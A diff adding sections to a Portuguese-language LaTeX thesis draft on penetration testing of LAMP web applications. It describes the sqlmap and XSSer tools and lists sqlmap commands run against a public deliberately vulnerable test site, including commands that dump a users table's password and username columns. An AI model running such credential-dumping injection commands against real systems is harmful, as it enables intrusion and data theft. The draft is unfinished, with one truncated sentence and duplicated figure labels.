@@ -1,3 +1,5 @@
+
+
 \chapter{Conceitos}
 \label{cap:conceitos}
 
@@ -402,21 +404,129 @@ simples, fácil de usar e que cumpre seu objetivo com perfeição.
 
 \subsubsection{sqlmap}
 
-Outra ferramenta que será utilizada para testes e posteriormente apresentado resultados na seção \label{ataques} será o \textit{sqlmap}, o qual é uma ferramenta especializada que 
-automatiza o processo de detecção e exploração em aplicações com vulnerabilidade para \ac{SQL} \textit{Injection}.
+Outra ferramenta que será utilizada para testes e posteriormente apresentado resultados na seção \label{ataques} será o \textit{sqlmap}, o qual é uma ferramenta \textit{open source}
+especializada em \ac{SQL} injection e que automatiza o processo de detecção e exploração. Segundo \cite{sqlma32:online}, esta ferramenta possui algumas 
+funcionalidades/características:
 
+\begin{itemize}
+ \item Suporte para diferentes Banco de Dados.
+ \item Suporte para diferentes técnicas de \ac{SQL} \textit{injection}.
+ \item Suporte para enumerar usuários, \textit{password hashes}, tabelas e colunas do \ac{BD}.
+ \item Suporte para derrubar tabelas do \ac{BD}.
+\end{itemize}
+
+Entretanto, mesmo com esta ferramenta proporcionando várias funcionalidades, necessita-se de um bom conhecimento para a realização de um ataque. 
+
+\subsubsection{XSSer}
+
+Uma ferramenta que pode facilitar na hora de realizar ataques de \ac{XSS} é a ferramenta XSSer, a qual é automizada para detectar, explorar e reportar vulnerabilidades de \ac{XSS} em 
+aplicações \textit{web}. Para utilizar desta ferramenta é necessário ter a linguagem Python instalada e algumas bibliotecas específicas.
+
+Na Fig.~\ref{xsser} têm-se um exemplo do funcionamento da ferramenta XSSer.
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/Xsser-url-schema.png}
+\caption{Exemplo de funcionamento do XSSer. Fonte: owasp.org}
+\label{fig:xsser}
+\end{figure}
 
 \subsection{TÉCNICAS X MÉTODOS X FERRAMENTAS}
 
+Técnicas, métodos e ferramentas se trabalhados em conjunto conseguem realizar até os mais minuciosos testes de vulnerabilidades e consequentemente verificar e possivelmente 
+corrigir os problemas apresentados. Porém, integrar estes três pode ser uma tarefa bastante complexa, sendo necessário a experiência de quem ficará responsável pelo monitoramente e a 
+realização de testes de penetração das aplicações \ac{LAMP}.
+
+Se vistos de forma separados, técnica pode ser dita como a experiência do atacante, representando como o ataque irá ser realizado, já método pode ser visto como qual será o ataque 
+a ser realizado, e ferramenta como um facilitador para que o atacante consiga acessar sua aplicação de forma ilegal. Portanto, percebe-se que não pode faltar nenhum desses componentes 
+para que haja um aproveitamento máximo dos testes de penetração.
 
 
 \chapter{ATAQUES E ANÁLISE}
 \label{ataques}
 
+Neste capítulo será apresentado os ataques realizados e algumas análises dos mesmos, bem como possíveis soluções para os problemas encontrados. Para a realização dos ataques será 
+utilizado algumas ferramentas auxiliares, como: Vega, sqlmap (ver seção~\ref{lampkali} para mais detalhes).
+
 \section{AMBIENTE DE TESTES E PLANO DE TESTES}
 
+Todos os testes aqui apresentados foi executado em \textit{sites} 
 
 \section{SESSÃO DE ATAQUES}
+
+\begin{lstlisting}[style=BashInputStyle]
+    $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
+    -D acuart -T users --columns
+\end{lstlisting}
+
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/sqlmap_columnsnames_acuart.png}
+\caption{Nome das colunas de um \ac{BD}. Fonte: Próprio autor}
+\label{fig:XSS}
+\end{figure}
+
+\begin{lstlisting}[style=BashInputStyle]
+    $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
+    --dbs --threads 3
+\end{lstlisting}
+
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/sqlmap_dbnames_acuart.png}
+\caption{Nome dos \ac{BD}. Fonte: Próprio autor}
+\label{fig:XSS}
+\end{figure}
+
+\begin{lstlisting}[style=BashInputStyle]
+    $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
+    --dbs --threads 3
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/sqlmap_tablenames2_acuart.png}
+\caption{Nome das tabelas no \ac{BD}. Fonte: Próprio autor}
+\label{fig:XSS}
+\end{figure}
+
+\begin{lstlisting}[style=BashInputStyle]
+    $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
+    --tables --threads 3
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/sqlmap_tablenames_acuart.png}
+\caption{. Fonte: Próprio autor}
+\label{fig:XSS}
+\end{figure}
+
+\begin{lstlisting}[style=BashInputStyle]
+    $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
+    --threads 3 -D acuart -T users -C pass --dump
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/sqlmap_pass_acuart.png}
+\caption{. Fonte: Próprio autor}
+\label{fig:XSS}
+\end{figure}
+
+\begin{lstlisting}[style=BashInputStyle]
+    $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
+    --threads 3 -D acuart -T users -C uname --dump
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/sqlmap_uname_acuart.png}
+\caption{. Fonte: Próprio autor}
+\label{fig:XSS}
+\end{figure}
 
 \section{ANÁLISE DOS RESULTADOS}
 
